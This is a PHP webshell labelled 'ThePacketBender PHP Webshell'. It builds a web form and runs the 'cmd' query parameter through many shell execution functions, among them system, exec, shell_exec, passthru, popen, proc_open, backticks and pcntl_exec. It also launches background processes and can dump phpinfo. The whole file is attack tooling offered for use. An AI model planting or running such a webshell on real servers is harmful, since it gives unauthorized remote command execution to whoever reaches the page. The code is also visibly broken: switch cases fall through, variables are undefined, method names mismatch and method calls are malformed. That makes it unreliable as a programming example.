<?php

echo '<html>';
echo '<head>';
echo '</head>';
echo '<body>';

//heading
echo '<div align="center" name="heading">';
echo '<p><b>ThePacketBender PHP Webshell</b></p>';
echo '<p>testing php command execution</p>';
echo '<br/>'. php_uname();
echo '</div>';


//inputs(GET)
$iget = <<<'IGET'
<div align="left" name="in">
<form action ="?" method="get" style="margin-left:10%;">
<fieldset>
	<br/><input type="text" name="cmd" style="width:550px;height:50px;">
	<br/><select name="function" style="width:30%" style="padding-right:4%;">
IGET;
$optvals = array(
	"backticks" => "backticks [unix]",
	"exe" => "exec [unix(sh/suexec)/win(cmd.exe)]",
	"exebg" => "execBackground(custom function) [unix(sd/suexec)/win(cmd, no window)]",
	"pcntlexe" => "pcntl_exec [unix]",
	"pthru" => "passthru [unix/win]",
	"popen" => "popen [unix/win]",
	"procopen" => "proc_open [unix]",
	"sexec" => "shell_exec [unix(sh)/win(cmd.exe)]",
	"sys" => "system [unix(sh)/win(cmd.exe)]"
);

function ugot($optvals){
       	foreach($optvals as $v => $val){
		echo '<option value ="' . $v . '">' . $val . '</option>';	
	}	
}

$igot = '	</select>
	<input type="checkbox" name="process" value="isProcess" style="padding-left=10px"> run as process?
	<input type="submit" value="submit" style="padding-left=25px;">
</fieldset>
</form>
</div>';

echo $iget;
ugot($optvals);
echo $igot;


//print status
foreach ($pro as $x) {
	$x.dispProc();
}


//classes for custom rce stdio
class Process{
	private $pid;
	private $cmd;

	//execute command to ignore signals
	private function runCmd(){
		if (substr(php_uname(), 0, 7) == "Windows"){
			$cmd = 'START /B /min '.$this->cmd;
		}
		else{	
			$cmd = 'nohup '.$this->cmd.' 2>/dev/null 2>&1 & echo $!';
			//exec($cmd, $output, $rl);
			$this->pid = (int)$op[0];
		}
	}
	//set process ID
	public function sPid($pid){
		$this->pid = $pid;
	}
	//get process ID
	public function gPid(){
		return $this->pid;
	}
	//check status if command execution is non-blind
	public function ps(){
		//define command command for given OS
		if (substr(php_uname(), 0, 7) == "Windows"){
			$this->cmd = 'tasklist | FINDSTR '.$this->pid;
		}
		else {
			$this->cmd = 'ps -aux | grep '.$this->pid;
		}
		//exec($command,$op);
		if (!isset($op[1]))return false;
		else return true;
	}
	public function start(){
		if ($this->cmd . $this->cmd != ''){
			$this->runCom();
		}
		else{
			return true;
		}
	}
	public function stop(){
		gPid();
		$this->cmd = 'kill '. $this->pid;
		//exec($command,$op);
		if ($this->status() == false){
			return true;
		}
		else {
			return false;
		}
	}
	public function dispProc(){
		echo $this->pid .' '. $this->cmd .'<input type="submit" value="kill" style="padding-left=10px;">';
	}
}


//functions for custom rce stdio
function execBackground($cmd) {
	if (substr(php_uname(), 0, 7) == "Windows"){
		pclose(popen("start /B ". $cmd, "r"));
	}
	else {
		exec($cmd . " > /dev/null &");
	}
}
$i = 0;
$pro = array();
function proc($cmd) {
	$i++;
	$i = new Process();
	$i->cmd = $cmd;
	$i.start();
	$pro[] = &$i;

	return $cmd;
}

//standard output
function stdout($cmd) {
	//check for value
	if ($_GET["cmd"] != NULL){
		$cmd = $_GET["cmd"];
	}
	//instantiate as Process if true
	if ($_GET["isProcess"] == True){
		//DO WORK HERE
		//THIS IS WHERE class object returns code for jobbing
		//e.g. cmd = ProcessName->cmd . $_GET($cmd);
		$prefix = proc($cmd);
		$prefix .= $cmd;
		$cmd = prefix;
	}
	echo '<br/><br/><div name="out" style="margin-left:10%;">';
	switch ($_GET["function"]) {
		case backticks:
			echo `$cmd`;
		case exe:
			exec($cmd,$output,$rv);
				print "return value " . $rv;
				print "----------------------";
				print "--------output--------";
				print "----------------------";
				echo '<div style=margin-left:5%>';
				print $output;
		//made redundant?
		case exebg:
			execBackground($cmd);
		case pcntlexe:
			$args = preg_split('/ /', $_GET[cmd], 1, PREG_SPLIT_OFFSET_CAPTURE);
			echo pcntl_exec($cmd[0],$args);
		case popn:
			$rets = popen($cmd, 'r');
			$read = fread($rets, 4096);
			echo $read;		
		case procopen:
			$descriptor = array(
				0 => array("pipe", "r"), //stdin
				1 => array("pipe", "w"), //stdout
				2 => array("file", "/dev/null", "a") //stderr
			);
			echo proc_open($cmd, $descriptor); 
		case pthru:
			$rets = "";
			passthru($cmd, $rets);
			print $rets;
		case sexec:
			echo shell_exec($_GET["cmd"]);
		case sys:
			$rets = "";
			system($cmd, $rets);
			print $rets;
		default:
			

	}
echo	'</div>';
}
print(stdout());
echo '<br/>';
if ($_GET[$pinfo]=pinfo) {
	echo phpinfo();
}
echo '</body>';
echo '</html>';

?>
